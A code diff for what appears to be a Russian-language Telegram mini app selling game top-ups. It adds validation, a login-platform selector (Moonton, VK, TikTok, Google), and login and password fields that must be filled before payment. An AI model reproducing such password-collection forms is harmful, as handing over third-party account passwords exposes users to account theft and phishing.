@@ -884,19 +884,53 @@
 
         // ПРОВЕРКА ВВОДА: Финальная кнопка оплаты активируется, только когда введены ID и сервер
         function validateInputs() {
-            const idVal = document.getElementById('player-id').value;
-            const serverVal = document.getElementById('player-server').value;
+            const idInput = document.getElementById('player-id');
+            const serverInput = document.getElementById('player-server');
+            const methodSelect = document.getElementById('player-login-method');
+            const loginInput = document.getElementById('player-login');
+            const passInput = document.getElementById('player-password');
+            const agreeCheckbox = document.getElementById('legal-agree');
             const payBtn = document.getElementById('pay-button');
 
-            // ID игрока должен быть длиннее 4 цифр, а сервер — строго 4 цифры
-            if (idVal.length > 4 && serverVal.length === 4) {
+            if (!payBtn) return;
+
+            const idVal = idInput.value ? idInput.value.trim() : "";
+            const serverVal = serverInput.value ? serverInput.value.trim() : "";
+            const methodVal = methodSelect.value || "";
+            const loginVal = loginInput.value ? loginInput.value.trim() : "";
+            const passVal = passInput.value ? passInput.value.trim() : "";
+            const isAgreed = agreeCheckbox.checked;
+
+            // Строгие проверки форматов и длины
+            const isIdValid = idVal.length >= 5 && idVal.length <= 12 && /^\d+$/.test(idVal);
+            idInput.style.borderColor = idVal === "" ? "rgba(212, 175, 55, 0.2)" : (isIdValid ? "#d4af37" : "#ff4a4a");
+
+            const isServerValid = serverVal.length === 4 && /^\d+$/.test(serverVal);
+            serverInput.style.borderColor = serverVal === "" ? "rgba(212, 175, 55, 0.2)" : (isServerValid ? "#d4af37" : "#ff4a4a");
+
+            const isMethodValid = methodVal !== "";
+            methodSelect.style.borderColor = methodVal === "" ? "rgba(212, 175, 55, 0.2)" : (isMethodValid ? "#d4af37" : "#ff4a4a");
+
+            const isLoginValid = loginVal !== "" && loginVal.length >= 4;
+            loginInput.style.borderColor = loginVal === "" ? "rgba(212, 175, 55, 0.2)" : (isLoginValid ? "#d4af37" : "#ff4a4a");
+
+            const isPassValid = passVal !== "" && passVal.length >= 5;
+            passInput.style.borderColor = passVal === "" ? "rgba(212, 175, 55, 0.2)" : (isPassValid ? "#d4af37" : "#ff4a4a");
+
+            // Кнопка включится ТОЛЬКО при выполнении ВСЕХ условий сразу
+            if (isIdValid && isServerValid && isMethodValid && isLoginValid && isPassValid && isAgreed) {
                 payBtn.disabled = false;
-                payBtn.style.opacity = 1;
+                payBtn.style.opacity = '1';
+                payBtn.style.pointerEvents = 'auto';
+                payBtn.style.boxShadow = '0 0 15px rgba(212, 175, 55, 0.4)';
             } else {
                 payBtn.disabled = true;
-                payBtn.style.opacity = 0.5;
+                payBtn.style.opacity = '0.4';
+                payBtn.style.pointerEvents = 'none';
+                payBtn.style.boxShadow = 'none';
             }
         }
+
 
         function startPayment() {
             if (tg && tg.HapticFeedback) tg.HapticFeedback.impactOccurred('heavy');
@@ -925,21 +959,41 @@
 
         <div class="input-group">
             <label class="input-label">Сервер (4 цифры)</label>
-            <input type="number" id="player-server" class="sheet-input" placeholder="Например: 2044" oninput="validateInputs()">
+            <input type="number" id="player-server" class="sheet-input" placeholder="Например: 2044" oninput="if(this.value.length > 4) this.value = this.value.slice(0,4); validateInputs();">
         </div>
 
-        <!-- СТРОКА СТОИМОСТИ -->
+        <div class="input-group">
+            <label class="input-label">Платформа входа</label>
+            <select id="player-login-method" class="sheet-input" style="cursor: pointer; appearance: none; -webkit-appearance: none; background-image: url('data:image/svg+xml;utf8,<svg xmlns=\'http://w3.org\' width=\'24\' height=\'24\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'%236c84a6\' stroke-width=\'2\' stroke-linecap=\'round\' stroke-linejoin=\'round\'><polyline points=\'6 9 12 15 18 9\'></polyline></svg>'); background-repeat: no-repeat; background-position: right 14px center; background-size: 16px;" onchange="validateInputs()">
+                <option value="" disabled selected style="color: rgba(138, 161, 199, 0.4);">Выберите платформу...</option>
+                <option value="Moonton" style="background: #121a29; color: #fff;">Moonton ID</option>
+                <option value="VK" style="background: #121a29; color: #fff;">ВКонтакте</option>
+                <option value="TikTok" style="background: #121a29; color: #fff;">TikTok</option>
+                <option value="Google" style="background: #121a29; color: #fff;">Google Аккаунт</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <label class="input-label">Логин (Почта / Телефон)</label>
+            <input type="text" id="player-login" class="sheet-input" placeholder="example@mail.com" oninput="validateInputs()">
+        </div>
+
+        <div class="input-group">
+            <label class="input-label">Пароль от аккаунта</label>
+            <input type="password" id="player-password" class="sheet-input" placeholder="••••••••" oninput="validateInputs()">
+        </div>
+
         <div style="text-align: center; margin: 15px 0; font-size: 16px; font-weight: 700; color: #ffffff;">
             Стоимость: <span id="modal-price-text" style="color: #d4af37; font-size: 18px; font-weight: 800;">0 ₽</span>
         </div>
 
-        <!-- ГАЛОЧКА ЮРИДИЧЕСКОГО СОГЛАСИЯ -->
         <div style="display: flex; align-items: flex-start; gap: 10px; margin: 15px 0 5px 0; text-align: left;">
             <input type="checkbox" id="legal-agree" style="margin-top: 3px; cursor: pointer; accent-color: #d4af37;" onchange="validateInputs()">
             <label for="legal-agree" style="font-size: 11px; color: #6c84a6; line-height: 1.4; cursor: pointer; user-select: none;">
-                Я подтверждаю согласие на обработку персональных данных и принимаю условия <a href="#" style="color: #d4af37; text-decoration: none; border-bottom: 1px dashed #d4af37;">Публичной оферты</a>
+                Я подтверждаю согласие на обработку персональных данных и принимаю условия Публичной оферты
             </label>
         </div>
+
 
         <!-- ЗОЛОТАЯ КНОПКА ПЕРЕХОДА К ОПЛАТЕ -->
         <button id="pay-button" class="action-btn" style="margin-top: 15px;" disabled onclick="startPayment()">
